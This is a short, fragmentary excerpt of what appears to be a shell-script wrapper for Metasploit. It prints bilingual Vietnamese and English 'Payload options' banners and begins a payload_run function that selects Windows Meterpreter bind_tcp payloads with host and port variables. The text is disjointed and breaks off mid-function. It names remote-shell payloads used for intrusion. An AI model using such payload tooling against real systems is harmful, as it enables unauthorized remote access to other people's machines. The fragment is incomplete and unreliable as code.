...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/auto/meterpreter/bind_tcp):
...
no="     no "
cat << !
Payload options (windows/auto/meterpreter/bind_tcp):
...
function payload_run {
	paylo="windows/auto/meterpreter/bind_tcp"
	paylo1="windows/meterpreter/bind_tcp"
	paylo2="windows/x64/meterpreter/bind_tcp"
	rhost=$rhost
	lport1=$lport1
	lport2=$lport2
	exitfunc=$exitfunc
